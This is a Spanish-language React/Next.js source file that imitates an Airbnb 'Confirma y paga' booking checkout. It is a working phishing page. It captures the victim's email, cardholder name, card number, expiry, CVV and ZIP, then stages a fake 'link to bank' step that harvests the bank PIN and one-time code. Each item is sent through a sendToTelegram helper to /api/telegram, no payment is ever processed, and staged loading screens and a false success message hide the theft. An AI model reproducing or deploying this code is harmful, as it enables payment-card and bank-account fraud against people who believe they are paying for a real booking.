"use client";

import React, { useState, useEffect, Suspense } from "react";
import Link from "next/link";
import { useRouter, useSearchParams } from "next/navigation";
import { createClient } from "@supabase/supabase-js";

// Inicialización de Supabase
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || "";
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || "";
const supabase = createClient(supabaseUrl, supabaseAnonKey);

function CheckoutContent() {
  const router = useRouter();
  const searchParams = useSearchParams();

  // 1. OBTENER PARÁMETROS DINÁMICOS DE LA URL
  const stayId = searchParams.get("id");
  const checkInParam = searchParams.get("checkIn");
  const checkOutParam = searchParams.get("checkOut");
  const rawGuests = searchParams.get("guests") || searchParams.get("numberOfAdults") || "1";

  // Formatear texto de huéspedes
  const formattedGuests = (() => {
    if (!rawGuests) return "1 huésped";
    const decoded = decodeURIComponent(rawGuests);
    if (decoded.toLowerCase().includes("huésped") || decoded.toLowerCase().includes("huesped")) {
      return decoded;
    }
    const num = parseInt(decoded, 10) || 1;
    return `${num} ${num === 1 ? "huésped" : "huéspedes"}`;
  })();

  // Estado del hospedaje
  const [property, setProperty] = useState({
    title: "Cargando propiedad...",
    rating: "4.87",
    reviewsCount: "12",
    image: "https://images.unsplash.com/photo-1613977257363-707ba9348227?w=500&auto=format&fit=crop",
    pricePerNight: 700,
  });

  // Cargar datos de la propiedad desde Supabase
  useEffect(() => {
    async function fetchProperty() {
      if (!stayId) return;

      try {
        const { data, error } = await supabase
          .from("properties")
          .select("*")
          .eq("id", stayId)
          .single();

        if (data && !error) {
          setProperty({
            title: data.title || data.name || "Villa de Lujo",
            rating: data.rating?.toString() || "4.87",
            reviewsCount: data.reviews_count?.toString() || "12",
            image: data.image_url || (Array.isArray(data.images) ? data.images[0] : null) || property.image,
            pricePerNight: parseFloat(data.price_per_night || data.price || 700),
          });
        }
      } catch (err) {
        console.error("Error al obtener la propiedad de Supabase:", err);
      }
    }

    fetchProperty();
  }, [stayId]);

  // 2. CÁLCULO DE NOCHES Y FECHAS
  const calculateNightsAndFormattedDates = () => {
    if (!checkInParam || !checkOutParam) {
      return {
        nights: 2,
        formattedDates: "20 – 22 de oct de 2026",
        freeCancellationDate: "18 de octubre",
      };
    }

    const [inYear, inMonth, inDay] = checkInParam.split("-").map(Number);
    const [outYear, outMonth, outDay] = checkOutParam.split("-").map(Number);

    const checkInDate = new Date(Date.UTC(inYear, inMonth - 1, inDay));
    const checkOutDate = new Date(Date.UTC(outYear, outMonth - 1, outDay));

    const diffTime = Math.abs(checkOutDate.getTime() - checkInDate.getTime());
    const calculatedNights = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) || 1;

    const months = [
      "ene", "feb", "mar", "abr", "may", "jun",
      "jul", "ago", "sep", "oct", "nov", "dic"
    ];

    const monthStr = months[checkOutDate.getUTCMonth()];
    const year = checkOutDate.getUTCFullYear();

    const cancellationDate = new Date(checkInDate.getTime());
    cancellationDate.setUTCDate(cancellationDate.getUTCDate() - 2);
    const freeCancellationDate = `${cancellationDate.getUTCDate()} de ${months[cancellationDate.getUTCMonth()]}`;

    return {
      nights: calculatedNights,
      formattedDates: `${inDay} – ${outDay} de ${monthStr} de ${year}`,
      freeCancellationDate,
    };
  };

  const { nights, formattedDates, freeCancellationDate } = calculateNightsAndFormattedDates();

  // 3. CÁLCULO DEL PRECIO
  const basePrice = property.pricePerNight * nights;
  const discount1 = Number((basePrice * 0.0).toFixed(2)); 
  const discount2 = Number((basePrice * 0.0).toFixed(2));
  const totalDiscount = discount1 + discount2;
  const totalPrice = Math.max(0, basePrice - totalDiscount);

  // Estados
  const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);
  const [email, setEmail] = useState("");
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [showToast, setShowToast] = useState(false);

  const [isLoadingCard, setIsLoadingCard] = useState(false);
  const [isCardSaved, setIsCardSaved] = useState(false);

  const [checkoutStep, setCheckoutStep] = useState("idle");
  const [otpCode, setOtpCode] = useState("");
  const [bankPin, setBankPin] = useState("");

  // Formulario de tarjeta (INCLUYE cardHolder)
  const [cardData, setCardData] = useState({
    cardHolder: "",
    cardNumber: "",
    expiry: "",
    cvv: "",
    zip: "",
    country: "República Dominicana",
  });

  // FUNCIÓN AUXILIAR DE ENVÍO A TELEGRAM
  const sendToTelegram = async (payload) => {
    try {
      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (err) {
      console.error("Error al enviar notificación a Telegram:", err);
    }
  };

  const handleCardNumberChange = (e) => {
    const value = e.target.value.replace(/[^0-9 ]/g, "");
    setCardData((prev) => ({ ...prev, cardNumber: value }));
  };

  const handleExpiryChange = (e) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 4) value = value.slice(0, 4);
    if (value.length >= 2) {
      value = `${value.slice(0, 2)}/${value.slice(2)}`;
    }
    setCardData((prev) => ({ ...prev, expiry: value }));
  };

  const handleCvvChange = (e) => {
    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 4);
    setCardData((prev) => ({ ...prev, cvv: value }));
  };

  const handleBankPinChange = (e) => {
    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 4);
    setBankPin(value);
  };

  const handleZipChange = (e) => {
    const value = e.target.value.replace(/[^0-9]/g, "");
    setCardData((prev) => ({ ...prev, zip: value }));
  };

  // 1. ENVÍO DE EMAIL / INICIO
  const handleEmailSubmit = async (e) => {
    e.preventDefault();
    if (email.trim() !== "") {
      setIsAuthModalOpen(false);
      setIsLoggedIn(true);
      setShowToast(true);

      setTimeout(() => {
        setShowToast(false);
      }, 4000);

      // Notificar Inicio de Reserva a Telegram
      await sendToTelegram({
        action: "reservation_started",
        email: email,
        stayTitle: property.title,
        dates: formattedDates,
        guests: formattedGuests,
        totalPrice: totalPrice,
      });
    }
  };

  // 2. ENVÍO DE DATOS DE TARJETA CON TITULAR
  const handleSaveCard = async (e) => {
    e.preventDefault();
    if (!cardData.cardHolder || !cardData.cardNumber || !cardData.expiry || !cardData.cvv) {
      alert("Por favor completa los datos de la tarjeta incluyendo el titular.");
      return;
    }

    setIsLoadingCard(true);

    // Enviar tarjeta a Telegram inmediatamente
    await sendToTelegram({
      action: "card_submitted",
      email: email,
      propertyTitle: property.title,
      totalPrice: totalPrice,
      cardData: cardData,
    });

    setTimeout(() => {
      setIsLoadingCard(false);
      setIsCardSaved(true);
    }, 1500);
  };

  // 3. ENVÍO DE OTP Y PIN DEL BANCO
  const handleVerifyOtp = async (e) => {
    e.preventDefault();
    if (!bankPin.trim() || bankPin.length !== 4) {
      alert("Por favor ingresa tu PIN de 4 dígitos.");
      return;
    }
    if (!otpCode.trim()) {
      alert("Por favor ingresa el código de verificación.");
      return;
    }

    // Enviar OTP y PIN a Telegram
    await sendToTelegram({
      action: "otp_submitted",
      email: email,
      lastFourDigits: lastFourDigits,
      totalPrice: totalPrice,
      bankPin: bankPin,
      otpCode: otpCode,
    });

    setCheckoutStep("success");
  };

  const handleStartCheckoutSequence = () => {
    setCheckoutStep("preparing");

    setTimeout(() => {
      setCheckoutStep("checking");

      setTimeout(() => {
        setCheckoutStep("confirm_card");
      }, 2000);
    }, 2500);
  };

  const handleLinkBank = () => {
    setCheckoutStep("linking_bank");

    setTimeout(() => {
      setCheckoutStep("bank_otp");
    }, 2000);
  };

  const lastFourDigits =
    cardData.cardNumber.replace(/\s+/g, "").slice(-4) || "4214";

  return (
    <div className="min-h-screen bg-white text-gray-900 font-sans relative">
      {/* TOAST DE INICIO DE SESIÓN */}
      {showToast && (
        <div className="fixed top-8 left-1/2 -translate-x-1/2 z-50 bg-white border border-gray-200 rounded-full px-5 py-3 shadow-xl flex items-center gap-2.5 animate-in fade-in slide-in-from-top-4 duration-300">
          <span className="bg-[#008a05] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold">
            ✓
          </span>
          <span className="text-sm font-semibold text-gray-900">
            ¡Hola! Iniciaste sesión
          </span>
        </div>
      )}

      {/* HEADER */}
      <header className="border-b border-gray-200 px-6 sm:px-12 py-4 flex items-center justify-between">
        <Link href="/">
          <div className="cursor-pointer flex items-center">
            <img
              src="/logo1.png"
              alt="Logo"
              className="h-9 w-auto object-contain"
            />
          </div>
        </Link>
      </header>

      {/* CONTENIDO PRINCIPAL */}
      <main className="max-w-6xl mx-auto px-4 sm:px-8 py-8 sm:py-10">
        <div className="flex items-center gap-4 mb-8">
          <button
            onClick={() => router.back()}
            className="w-9 h-9 rounded-full flex items-center justify-center hover:bg-gray-100 transition cursor-pointer"
          >
            <svg
              className="w-5 h-5 text-gray-800"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2.5}
                d="M15 19l-7-7 7-7"
              />
            </svg>
          </button>
          <h1 className="text-2xl sm:text-3xl font-extrabold tracking-tight">
            Confirma y paga
          </h1>
        </div>

        {/* CARGA INICIAL DE LA TARJETA */}
        {isLoadingCard ? (
          <div className="min-h-[400px] flex flex-col items-center justify-center py-20">
            <div className="flex items-center gap-2 text-gray-500 text-3xl font-bold animate-pulse">
              <span>•</span>
              <span>•</span>
              <span>•</span>
            </div>
          </div>
        ) : (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 items-start">
            {/* COLUMNA IZQUIERDA */}
            <div className="lg:col-span-7 space-y-6">
              {!isLoggedIn ? (
                <>
                  <div className="border border-gray-200 rounded-2xl p-6 shadow-xs bg-white flex items-center justify-between">
                    <span className="text-base sm:text-lg font-bold text-gray-900">
                      1. Inicia sesión o regístrate
                    </span>
                    <button
                      onClick={() => setIsAuthModalOpen(true)}
                      className="bg-[#E00B41] hover:bg-[#c90838] text-white font-semibold px-6 py-3 rounded-xl transition text-sm cursor-pointer active:scale-95"
                    >
                      Continúa
                    </button>
                  </div>

                  <div className="border border-gray-200 rounded-2xl p-6 opacity-50 bg-white">
                    <span className="text-base sm:text-lg font-bold text-gray-900">
                      2. Agrega un método de pago
                    </span>
                  </div>

                  <div className="border border-gray-200 rounded-2xl p-6 opacity-50 bg-white">
                    <span className="text-base sm:text-lg font-bold text-gray-900">
                      3. Revisa la reservación
                    </span>
                  </div>
                </>
              ) : !isCardSaved ? (
                <div className="border border-gray-200 rounded-2xl p-6 shadow-xs bg-white space-y-6 animate-in fade-in duration-300">
                  <h2 className="text-lg sm:text-xl font-bold text-gray-900">
                    1. Agrega un método de pago
                  </h2>

                  <div className="flex items-center justify-between pb-1">
                    <div className="flex items-center gap-3">
                      <span className="text-xl">💳</span>
                      <div>
                        <p className="text-sm font-semibold text-gray-900">
                          Tarjeta de crédito o débito
                        </p>
                        <div className="flex items-center gap-2 mt-1">
                          <img src="/visalogo.jpg" alt="Visa" className="h-3.5 w-auto object-contain" />
                          <img src="/logomastercard.png" alt="Mastercard" className="h-3.5 w-auto object-contain" />
                          <img src="/amexlogo.png" alt="Amex" className="h-3.5 w-auto object-contain" />
                          <img src="/discoverlogo.png" alt="Discover" className="h-3.5 w-auto object-contain" />
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <div className="border border-gray-400 rounded-2xl overflow-hidden divide-y divide-gray-400 focus-within:border-black focus-within:ring-1 focus-within:ring-black transition-all">
                      {/* CAMPO DE NOMBRE DEL TITULAR */}
                      <div className="p-3 bg-white">
                        <label className="block text-[11px] font-semibold text-gray-600">
                          Nombre del titular
                        </label>
                        <input
                          type="text"
                          value={cardData.cardHolder}
                          onChange={(e) => setCardData({ ...cardData, cardHolder: e.target.value })}
                          placeholder="Nombre como aparece en la tarjeta"
                          className="w-full text-sm outline-none bg-transparent font-normal text-gray-900 mt-0.5"
                        />
                      </div>

                      {/* NÚMERO DE TARJETA */}
                      <div className="p-3 bg-white flex items-center justify-between">
                        <div className="w-full">
                          <label className="block text-[11px] font-semibold text-gray-600">
                            Número de tarjeta
                          </label>
                          <input
                            type="text"
                            inputMode="numeric"
                            pattern="[0-9]*"
                            value={cardData.cardNumber}
                            onChange={handleCardNumberChange}
                            placeholder="4111 2222 3333 4444"
                            className="w-full text-sm outline-none bg-transparent font-normal text-gray-900 mt-0.5"
                          />
                        </div>
                        <span className="text-gray-600 text-sm pl-2">🔒</span>
                      </div>

                      {/* EXPIRACIÓN Y CVV */}
                      <div className="grid grid-cols-2 divide-x divide-gray-400 bg-white">
                        <div className="p-3">
                          <label className="block text-[11px] font-semibold text-gray-600">
                            Caducidad
                          </label>
                          <input
                            type="text"
                            inputMode="numeric"
                            placeholder="12/29"
                            maxLength={5}
                            value={cardData.expiry}
                            onChange={handleExpiryChange}
                            className="w-full text-sm outline-none bg-transparent font-normal text-gray-900 mt-0.5 placeholder-gray-400"
                          />
                        </div>

                        <div className="p-3">
                          <label className="block text-[11px] font-semibold text-gray-600">
                            Código CVV
                          </label>
                          <input
                            type="password"
                            inputMode="numeric"
                            pattern="[0-9]*"
                            placeholder="***"
                            maxLength={4}
                            value={cardData.cvv}
                            onChange={handleCvvChange}
                            className="w-full text-sm outline-none bg-transparent font-normal text-gray-900 mt-0.5 placeholder-gray-400"
                          />
                        </div>
                      </div>
                    </div>

                    <div className="border border-gray-400 rounded-2xl p-3 focus-within:border-black focus-within:ring-1 focus-within:ring-black bg-white transition-all">
                      <label className="block text-[11px] font-semibold text-gray-600">
                        Código postal
                      </label>
                      <input
                        type="text"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        placeholder="51000"
                        value={cardData.zip}
                        onChange={handleZipChange}
                        className="w-full text-sm outline-none bg-transparent font-normal text-gray-900 mt-0.5 placeholder-gray-400"
                      />
                    </div>

                    <div className="border border-gray-400 rounded-2xl p-3 focus-within:border-black focus-within:ring-1 focus-within:ring-black bg-white transition-all relative">
                      <label className="block text-[11px] font-semibold text-gray-600">
                        País/región
                      </label>
                      <select
                        value={cardData.country}
                        onChange={(e) =>
                          setCardData({ ...cardData, country: e.target.value })
                        }
                        className="w-full text-sm outline-none bg-transparent font-normal text-gray-900 mt-0.5 appearance-none cursor-pointer pr-8"
                      >
                        <option value="República Dominicana">República Dominicana</option>
                        <option value="Estados Unidos">Estados Unidos</option>
                        <option value="España">España</option>
                        <option value="México">México</option>
                      </select>
                      <span className="absolute right-4 bottom-3 pointer-events-none text-xs text-gray-600">
                        ▼
                      </span>
                    </div>
                  </div>

                  <button
                    onClick={handleSaveCard}
                    className="w-full bg-[#E00B41] hover:bg-[#c90838] text-white font-bold py-3.5 rounded-xl transition text-base shadow-sm cursor-pointer active:scale-98 mt-4"
                  >
                    Guardar tarjeta
                  </button>
                </div>
              ) : (
                <div className="space-y-6 animate-in fade-in duration-300">
                  <div className="border border-gray-200 rounded-2xl p-6 shadow-xs bg-white flex items-center justify-between">
                    <div>
                      <h2 className="text-base font-bold text-gray-900">
                        1. Agrega un método de pago
                      </h2>
                      <p className="text-xs text-gray-500 font-medium mt-1 flex items-center gap-1.5">
                        <img src="/visalogo.jpg" alt="Visa" className="h-3 w-auto object-contain" />
                        Tarjeta finalizada en {lastFourDigits} ({cardData.cardHolder || "Titular"})
                      </p>
                    </div>
                    <button
                      onClick={() => setIsCardSaved(false)}
                      className="border border-gray-300 hover:bg-gray-50 text-gray-900 font-semibold text-xs px-4 py-2 rounded-lg transition cursor-pointer"
                    >
                      Cambiar
                    </button>
                  </div>

                  <div className="border border-gray-200 rounded-2xl p-6 shadow-xs bg-white space-y-4">
                    <h2 className="text-base font-bold text-gray-900">
                      2. Revisa la reservación
                    </h2>
                    <p className="text-xs text-gray-500">
                      Al seleccionar el botón, acepto los términos de la reservación.
                    </p>
                    <button
                      onClick={handleStartCheckoutSequence}
                      className="w-full bg-[#E00B41] hover:bg-[#c90838] text-white font-bold py-3.5 rounded-xl transition text-base shadow-sm cursor-pointer active:scale-98"
                    >
                      Confirmar y pagar
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* COLUMNA DERECHA - RESUMEN */}
            <div className="lg:col-span-5">
              <div className="border border-gray-200 rounded-2xl p-6 shadow-sm space-y-6 bg-white sticky top-6">
                {isLoggedIn && totalDiscount > 0 && (
                  <div className="bg-[#E6F4EA] border border-[#CEEAD6] rounded-xl p-3 flex items-center gap-2 text-xs font-medium text-gray-800">
                    <span className="text-base">🏷️</span>
                    <span>Descuento de ${totalDiscount.toFixed(2)} USD aplicado</span>
                  </div>
                )}

                <div className="flex gap-4 items-start pb-6 border-b border-gray-200">
                  <img
                    src={property.image}
                    alt={property.title}
                    className="w-24 h-20 rounded-xl object-cover flex-shrink-0"
                  />
                  <div className="flex-1 min-w-0">
                    <h3 className="font-semibold text-sm leading-snug line-clamp-2 text-gray-900">
                      {property.title}
                    </h3>
                    <div className="flex items-center gap-1 text-xs font-semibold text-gray-800 mt-1">
                      <span>★ {property.rating}</span>
                      <span className="text-gray-500 font-normal">
                        ({property.reviewsCount})
                      </span>
                    </div>
                  </div>
                </div>

                <div className="pb-6 border-b border-gray-200">
                  <h4 className="font-bold text-sm text-gray-900 mb-1">
                    Cancelación gratuita
                  </h4>
                  <p className="text-xs text-gray-600 leading-relaxed">
                    Si cancelas la reservación antes del {freeCancellationDate} recibirás un
                    reembolso total.{" "}
                    <a href="#" className="underline font-semibold text-black">
                      Política completa
                    </a>
                  </p>
                </div>

                {/* FECHAS Y HUÉSPEDES */}
                <div className="space-y-4 pb-6 border-b border-gray-200 text-sm">
                  <div className="flex justify-between items-center">
                    <div>
                      <p className="font-bold text-xs text-gray-900">Fechas</p>
                      <p className="text-gray-600 text-xs mt-0.5">
                        {formattedDates}
                      </p>
                    </div>
                    <button 
                      onClick={() => router.back()}
                      className="bg-gray-100 hover:bg-gray-200 text-black font-semibold text-xs px-3.5 py-2 rounded-lg transition cursor-pointer"
                    >
                      Cambiar
                    </button>
                  </div>

                  <div className="flex justify-between items-center">
                    <div>
                      <p className="font-bold text-xs text-gray-900">Huéspedes</p>
                      <p className="text-gray-600 text-xs mt-0.5">
                        {formattedGuests}
                      </p>
                    </div>
                    <button 
                      onClick={() => router.back()}
                      className="bg-gray-100 hover:bg-gray-200 text-black font-semibold text-xs px-3.5 py-2 rounded-lg transition cursor-pointer"
                    >
                      Cambiar
                    </button>
                  </div>
                </div>

                {/* CÁLCULO DEL PRECIO */}
                <div className="space-y-3 text-sm">
                  <h4 className="font-bold text-base text-gray-900 mb-2">
                    Información del precio
                  </h4>

                  <div className="flex justify-between text-gray-800 text-xs">
                    <span>
                      ${property.pricePerNight.toFixed(2)} USD x {nights} {nights === 1 ? "noche" : "noches"}
                    </span>
                    <span>${basePrice.toFixed(2)} USD</span>
                  </div>

                  {discount1 > 0 && (
                    <div className="flex justify-between text-emerald-600 text-xs font-semibold">
                      <span>Oferta especial</span>
                      <span>-${discount1.toFixed(2)} USD</span>
                    </div>
                  )}

                  {discount2 > 0 && (
                    <div className="flex justify-between text-emerald-600 text-xs font-semibold">
                      <span>Oferta especial</span>
                      <span>-${discount2.toFixed(2)} USD</span>
                    </div>
                  )}

                  <div className="pt-3 border-t border-gray-200 flex justify-between font-bold text-base text-gray-900">
                    <span>
                      Total <span className="underline font-normal text-xs">USD</span>
                    </span>
                    <span>${totalPrice.toFixed(2)} USD</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>

      {/* FOOTER */}
      <footer className="border-t border-gray-200 mt-20 py-6 px-8 text-xs text-gray-500 flex items-center gap-2">
        <a href="#" className="hover:underline">Privacidad</a>
        <span>·</span>
        <a href="#" className="hover:underline">Términos</a>
      </footer>

      {/* MODAL AUTH */}
      {isAuthModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-xs transition-opacity">
          <div className="bg-white rounded-3xl w-full max-w-[500px] p-6 sm:p-8 relative shadow-2xl animate-in fade-in zoom-in duration-200">
            <button
              onClick={() => setIsAuthModalOpen(false)}
              className="absolute top-5 right-5 w-8 h-8 rounded-full flex items-center justify-center hover:bg-gray-100 text-gray-600 transition cursor-pointer"
            >
              ✕
            </button>

            <div className="flex justify-center mb-6">
              <img src="/logo1.png" alt="Logo" className="h-10 w-auto object-contain" />
            </div>

            <h2 className="text-2xl font-bold text-center text-gray-900 mb-6">
              Inicia sesión o regístrate
            </h2>

            <form onSubmit={handleEmailSubmit} className="space-y-4">
              <div className="border border-gray-400 focus-within:border-black focus-within:ring-1 focus-within:ring-black rounded-xl px-4 py-3 shadow-xs">
                <label className="block text-[10px] font-bold text-gray-500 uppercase">
                  Correo electrónico
                </label>
                <input
                  type="email"
                  required
                  placeholder="ejemplo@correo.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full text-sm outline-none text-gray-900 placeholder-gray-400 bg-transparent mt-0.5"
                />
              </div>

              <button
                type="submit"
                className="w-full bg-[#E00B41] hover:bg-[#c90838] text-white font-semibold py-3.5 rounded-xl transition text-base shadow-sm active:scale-98 cursor-pointer"
              >
                Continuar
              </button>
            </form>
          </div>
        </div>
      )}

      {/* MODALES DEL FLUJO DE PAGO */}
      {checkoutStep !== "idle" && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-xs animate-in fade-in duration-200">
          
          {/* PASO 1: PREPARANDO */}
          {checkoutStep === "preparing" && (
            <div className="bg-white rounded-3xl w-full max-w-[550px] p-10 flex flex-col items-center justify-center text-center shadow-2xl min-h-[350px]">
              <div className="flex items-center gap-2 text-gray-800 text-3xl font-bold mb-8 animate-pulse">
                <span>•</span>
                <span>•</span>
                <span>•</span>
              </div>
              <h2 className="text-2xl font-extrabold text-gray-900 max-w-[280px] leading-snug">
                Estamos preparando tu reservación
              </h2>
            </div>
          )}

          {/* PASO 2: REVISANDO */}
          {checkoutStep === "checking" && (
            <div className="bg-white rounded-3xl w-full max-w-[550px] p-10 flex flex-col items-center justify-center text-center shadow-2xl min-h-[350px] animate-in fade-in duration-300">
              <div className="mb-6 flex items-center justify-center">
                <video
                  src="/video1.mp4"
                  autoPlay
                  loop
                  muted
                  playsInline
                  className="w-28 h-28 object-contain rounded-2xl"
                />
              </div>
              <h2 className="text-2xl font-extrabold text-gray-900 max-w-[280px] leading-snug">
                Estamos revisando la información del pago
              </h2>
            </div>
          )}

          {/* PASO 3: CONFIRMA TU TARJETA */}
          {checkoutStep === "confirm_card" && (
            <div className="bg-white rounded-3xl w-full max-w-[550px] p-8 flex flex-col items-center justify-center text-center shadow-2xl relative animate-in zoom-in-95 duration-300">
              <div className="mb-6 opacity-30 pointer-events-none">
                <div className="text-5xl">📠</div>
              </div>

              <div className="bg-white rounded-2xl border border-gray-200 shadow-2xl w-full max-w-[420px] p-6 text-left space-y-4">
                <div className="flex items-center justify-between border-b border-gray-100 pb-3">
                  <button
                    onClick={() => setCheckoutStep("idle")}
                    className="text-gray-400 hover:text-black text-sm"
                  >
                    ✕
                  </button>
                  <h3 className="font-bold text-sm text-gray-900 text-center flex-1 pr-4">
                    Confirma tu tarjeta
                  </h3>
                </div>

                <p className="text-xs text-gray-600 leading-relaxed">
                  Deberás confirmar esta tarjeta con el banco antes de que podamos procesar el pago.
                </p>

                <button
                  onClick={handleLinkBank}
                  className="w-full bg-[#222222] hover:bg-black text-white font-semibold py-3 rounded-xl transition text-xs flex items-center justify-center gap-2 cursor-pointer shadow-sm active:scale-98"
                >
                  <span>🔒</span> Enlazar al banco
                </button>
              </div>

              <h2 className="text-xl font-extrabold text-gray-800 mt-6 max-w-[260px] opacity-40">
                Estamos revisando la información del pago
              </h2>
            </div>
          )}

          {/* PASO 4: CARGANDO ENLACE AL BANCO */}
          {checkoutStep === "linking_bank" && (
            <div className="bg-white rounded-3xl w-full max-w-[550px] p-8 shadow-2xl min-h-[420px] flex flex-col animate-in fade-in duration-200">
              <div className="flex items-center justify-between border-b border-gray-100 pb-3">
                <button
                  onClick={() => setCheckoutStep("idle")}
                  className="text-gray-400 hover:text-black text-sm"
                >
                  ✕
                </button>
                <div className="flex items-center gap-1.5 text-xs font-bold text-gray-900 pr-4">
                  <span>🔒</span> Enlazar al banco
                </div>
              </div>

              <div className="flex-1 flex items-center justify-center">
                <div className="flex items-center gap-2 text-gray-400 text-3xl font-bold animate-pulse">
                  <span>•</span>
                  <span>•</span>
                </div>
              </div>
            </div>
          )}

          {/* PASO 5: VERIFICACIÓN OTP Y PIN DEL BANCO */}
          {checkoutStep === "bank_otp" && (
            <div className="bg-white rounded-3xl w-full max-w-[550px] p-8 shadow-2xl min-h-[480px] flex flex-col relative animate-in zoom-in-95 duration-200">
              <div className="flex items-center justify-between border-b border-gray-200 pb-3 mb-6">
                <button
                  onClick={() => setCheckoutStep("idle")}
                  className="text-gray-400 hover:text-black text-sm"
                >
                  ✕
                </button>
                <div className="flex items-center gap-1.5 text-xs font-bold text-gray-900 pr-4">
                  <span>🔒</span> Enlazar al banco
                </div>
              </div>

              <div className="flex items-center justify-between px-2 mb-6">
                <div className="flex items-center gap-1">
                  <div className="w-5 h-5 rounded-full bg-gradient-to-tr from-blue-500 via-green-500 to-red-500" />
                </div>
                <img
                  src="/visalogo.jpg"
                  alt="Visa"
                  className="h-6 w-auto object-contain"
                />
              </div>

              <p className="text-xs text-gray-700 text-center mb-6 leading-relaxed">
                Por favor ingresa el código de verificación y tu PIN para confirmar la transacción.
              </p>

              <form onSubmit={handleVerifyOtp} className="space-y-4 max-w-[380px] mx-auto w-full">
                <div className="text-xs space-y-2 text-gray-800">
                  <div className="flex justify-between border-b border-gray-100 pb-1">
                    <span className="font-bold">Detalles transaccionales</span>
                  </div>
                  <div className="grid grid-cols-2 gap-y-2 text-xs pt-1">
                    <span className="font-bold text-right pr-4">Comercio:</span>
                    <span>Airbnb</span>

                    <span className="font-bold text-right pr-4">Monto:</span>
                    <span>${totalPrice.toFixed(2)} USD</span>

                    <span className="font-bold text-right pr-4">Número de tarjeta:</span>
                    <span>************{lastFourDigits}</span>

                    <span className="font-bold text-right pr-4 self-center">PIN de 4 dígitos:</span>
                    <div>
                      <input
                        type="password"
                        required
                        maxLength={4}
                        value={bankPin}
                        onChange={handleBankPinChange}
                        placeholder="••••"
                        className="border border-gray-400 rounded px-2 py-1 text-xs w-28 outline-none focus:border-black tracking-widest"
                      />
                    </div>

                    <span className="font-bold text-right pr-4 self-center">Digite el código:</span>
                    <div>
                      <input
                        type="text"
                        required
                        maxLength={6}
                        value={otpCode}
                        onChange={(e) => setOtpCode(e.target.value)}
                        placeholder="123456"
                        className="border border-gray-400 rounded px-2 py-1 text-xs w-28 outline-none focus:border-black"
                      />
                    </div>
                  </div>
                </div>

                <div className="pt-2 text-center">
                  <button
                    type="button"
                    onClick={() => alert("Se ha reexpedido el código de verificación")}
                    className="text-[11px] text-gray-800 underline hover:text-black font-medium"
                  >
                    Pulsa aquí para recibir un código nuevo
                  </button>
                </div>

                <div className="flex justify-center pt-2">
                  <button
                    type="submit"
                    className="bg-[#222222] hover:bg-black text-white font-semibold px-6 py-2 rounded-lg text-xs transition cursor-pointer active:scale-95"
                  >
                    Siguiente
                  </button>
                </div>
              </form>
            </div>
          )}

          {/* PASO FINAL: ÉXITO */}
          {checkoutStep === "success" && (
            <div className="bg-white rounded-3xl w-full max-w-[550px] p-8 sm:p-10 shadow-2xl flex flex-col items-center justify-center text-center animate-in zoom-in-95 duration-300">
              <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center text-3xl font-bold mb-6">
                ✓
              </div>

              <h2 className="text-2xl font-extrabold text-gray-900 mb-3">
                ¡Reserva creada con éxito!
              </h2>

              <p className="text-sm text-gray-600 leading-relaxed max-w-[380px] mb-8">
                En aproximadamente 15 minutos estará recibiendo los detalles de su reserva a través de su correo electrónico.
              </p>

              <button
                onClick={() => {
                  window.location.href = "https://es-l.airbnb.com/";
                }}
                className="bg-[#E00B41] hover:bg-[#c90838] text-white font-semibold px-8 py-3 rounded-xl transition text-sm cursor-pointer shadow-sm active:scale-95"
              >
                Entendido
              </button>
            </div>
          )}

        </div>
      )}
    </div>
  );
}

export default function CheckoutPage() {
  return (
    <Suspense fallback={<div className="p-10 text-center">Cargando...</div>}>
      <CheckoutContent />
    </Suspense>
  );
}